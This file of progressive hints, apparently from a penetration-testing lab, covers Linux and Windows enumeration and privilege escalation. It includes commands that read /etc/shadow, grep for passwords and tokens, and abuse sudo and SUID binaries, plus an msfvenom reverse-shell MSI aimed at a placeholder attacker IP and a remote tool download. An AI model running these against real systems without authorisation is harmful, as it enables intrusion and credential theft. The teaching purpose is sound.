# System Enumeration Hints

Progressive hints to help you through enumeration challenges.

---

## General Hints

### Hint 1: Getting Started
If you're stuck, always start with the basics:
```bash
id
whoami
hostname
uname -a
```
These four commands tell you who you are, where you are, and what you're working with.

### Hint 2: Redirection is Your Friend
When commands produce errors (like "permission denied"), redirect them:
```bash
# Hide errors
find / -perm -4000 2>/dev/null

# Save output
find / -perm -4000 2>/dev/null > suid_binaries.txt
```

### Hint 3: Use Tab Completion
Many enumeration paths can be discovered by tab completion:
```bash
cat /etc/[TAB][TAB]
ls -la /var/[TAB][TAB]
```

---

## Linux Enumeration Hints

### Finding SUID Binaries

<details>
<summary>Hint 1: Basic SUID search</summary>

```bash
find / -perm -4000 -type f 2>/dev/null
```
The `-perm -4000` finds files with the SUID bit set.
</details>

<details>
<summary>Hint 2: Understanding SUID output</summary>

When you see output like:
```
-rwsr-xr-x 1 root root 12345 Jan 1 2024 /usr/bin/somebinary
```
The `s` in `rws` means SUID is set and it runs as owner (root).
</details>

<details>
<summary>Hint 3: Which binaries are exploitable?</summary>

Check GTFOBins for each binary you find:
```bash
# Common exploitable SUID binaries:
# - find, vim, python, perl, nmap, less, more, nano
# - awk, tar, zip, env, ftp, ssh
```
</details>

### Checking Sudo Permissions

<details>
<summary>Hint 1: Basic sudo check</summary>

```bash
sudo -l
```
This shows what commands you can run with sudo.
</details>

<details>
<summary>Hint 2: No password entry</summary>

If you see `NOPASSWD:` it means you can run that command without a password:
```
(ALL) NOPASSWD: /usr/bin/vim
```
</details>

<details>
<summary>Hint 3: ALL means everything</summary>

If you see `(ALL) NOPASSWD: ALL`, you can run anything as root:
```bash
sudo su
# or
sudo /bin/bash
```
</details>

### Finding Credentials

<details>
<summary>Hint 1: Common credential locations</summary>

```bash
# Check these files:
cat ~/.bash_history
cat ~/.bashrc
cat /etc/shadow
cat /var/www/html/config.php
```
</details>

<details>
<summary>Hint 2: Search for keywords</summary>

```bash
grep -r "password" /etc/ 2>/dev/null
grep -r "secret" /home/ 2>/dev/null
grep -r "token" /var/ 2>/dev/null
```
</details>

<details>
<summary>Hint 3: Check environment variables</summary>

```bash
env | grep -i pass
env | grep -i secret
env | grep -i key
printenv
```
</details>

### Network Enumeration

<details>
<summary>Hint 1: What's listening?</summary>

```bash
# Modern systems
ss -tulpn

# Older systems
netstat -tulpn
```
</details>

<details>
<summary>Hint 2: Finding internal services</summary>

Look for services bound to 127.0.0.1:
```bash
ss -tulpn | grep "127.0.0.1"
```
These might be accessible to exploit locally.
</details>

<details>
<summary>Hint 3: Finding other hosts</summary>

```bash
# ARP cache shows recently contacted hosts
arp -a

# Check /etc/hosts
cat /etc/hosts

# Check SSH known_hosts
cat ~/.ssh/known_hosts
```
</details>

---

## Windows Enumeration Hints

### Finding User Information

<details>
<summary>Hint 1: Your current privileges</summary>

```powershell
whoami /all
```
This shows user, groups, and privileges.
</details>

<details>
<summary>Hint 2: Important privileges to look for</summary>

```
SeImpersonatePrivilege - Can impersonate tokens (Potato attacks)
SeBackupPrivilege - Can read any file
SeRestorePrivilege - Can write any file
SeTakeOwnershipPrivilege - Can take ownership of files
SeDebugPrivilege - Can debug processes (dump memory)
```
</details>

<details>
<summary>Hint 3: Admin group membership</summary>

```powershell
net localgroup administrators
```
If your user is listed, you can often elevate.
</details>

### Unquoted Service Paths

<details>
<summary>Hint 1: Finding vulnerable services</summary>

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"
```
</details>

<details>
<summary>Hint 2: Understanding the vulnerability</summary>

If a service path is:
```
C:\Program Files\My App\service.exe
```
Windows will try:
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\service.exe
```
You can place a malicious executable at one of these paths.
</details>

<details>
<summary>Hint 3: Checking write permissions</summary>

```powershell
# Check if you can write to the path
icacls "C:\Program Files\My App"
```
Look for (W) or (F) permissions for your user/group.
</details>

### AlwaysInstallElevated

<details>
<summary>Hint 1: Checking the registry</summary>

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Both must return 0x1 for the vulnerability to exist.
</details>

<details>
<summary>Hint 2: Exploiting with msfvenom</summary>

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f msi > evil.msi
```
Then on target:
```powershell
msiexec /quiet /qn /i evil.msi
```
</details>

---

## Tool-Specific Hints

### LinPEAS

<details>
<summary>Hint 1: Color coding</summary>

- RED/YELLOW: Critical findings (prioritize these)
- ORANGE: Interesting configuration
- GREEN: Potentially useful
- BLUE: Information only
</details>

<details>
<summary>Hint 2: Most important sections</summary>

Focus on these sections first:
- "99% PE vectors"
- "SUID - Check for exploitable binaries"
- "Sudo version"
- "Interesting files"
</details>

### PowerUp

<details>
<summary>Hint 1: Running all checks</summary>

```powershell
. .\PowerUp.ps1
Invoke-AllChecks | Format-List
```
</details>

<details>
<summary>Hint 2: Specific checks</summary>

```powershell
# Just check services
Get-ModifiableServiceFile
Get-UnquotedService

# Check registry
Get-ModifiableRegistryAutoRun

# Check scheduled tasks
Get-ModifiableScheduledTaskFile
```
</details>

---

## Troubleshooting

### "Permission denied" everywhere

<details>
<summary>Solution</summary>

You're a low-privilege user. This is normal. Focus on:
1. What CAN you read/execute?
2. SUID binaries (run as owner, not you)
3. Sudo permissions
4. Files in your home directory
</details>

### Commands not found

<details>
<summary>Solution</summary>

Different systems have different tools:
```bash
# Try alternatives
ip addr || ifconfig
ss -tulpn || netstat -tulpn

# Check what's available
which nc netcat ncat python python3 perl curl wget
```
</details>

### LinPEAS won't download

<details>
<summary>Solution</summary>

```bash
# If curl doesn't work, try wget
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# If no internet, transfer from your machine
# On your machine:
python3 -m http.server 8000

# On target:
curl http://YOUR_IP:8000/linpeas.sh -o linpeas.sh
```
</details>

---

## Quick Reference Commands

### Linux One-Liner Enumeration

```bash
id; whoami; hostname; uname -a; cat /etc/passwd | grep sh$; sudo -l 2>/dev/null; find / -perm -4000 2>/dev/null; ss -tulpn 2>/dev/null
```

### Windows One-Liner Enumeration

```powershell
whoami /all; systeminfo | findstr /B /C:"OS Name" /C:"OS Version"; net user; net localgroup administrators; netstat -ano | findstr LISTENING
```

---

**Back to:** [README](./README.md) | [Walkthrough](./walkthrough.md)
